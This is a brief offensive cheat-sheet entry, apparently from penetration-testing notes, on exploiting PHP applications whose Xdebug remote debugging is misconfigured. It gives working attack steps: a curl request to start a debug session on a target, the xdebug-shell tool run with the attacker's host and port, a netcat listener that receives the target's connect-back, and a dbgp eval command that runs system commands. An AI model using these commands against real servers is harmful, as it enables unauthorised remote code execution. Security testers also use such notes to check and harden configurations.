# Xdebug Remote Code Execution

Xdebug in remote mode listens for connections FROM the attacker — if misconfigured to allow any host, trigger eval via dbgp protocol.

**Check if Xdebug is active:**
```bash
curl -s http://<TARGET>/page.php?XDEBUG_SESSION_START=phpstorm | head
# look for Xdebug header: X-Debug-Token or Xdebug output
```

**Exploit with xdebug-shell (Python tool):**
```bash
git clone https://github.com/gteissier/xdebug-shell
python xdebug-shell.py --local <LHOST> --port 9000 --url http://<TARGET>/index.php
# gets interactive PHP eval shell
```

**Manual exploit via netcat + dbgp:**
1. Listen on 9000: `nc -lvnp 9000`
2. Trigger: `curl "http://<TARGET>/index.php?XDEBUG_SESSION_START=1"`
3. Send dbgp eval command to run PHP

**Execute system commands via eval:**
```
eval -i 1 -- <base64('system("id");')>
```

Affects PHP apps with `xdebug.remote_enable=On` and `xdebug.remote_connect_back=On` (or remote_host=* / any).
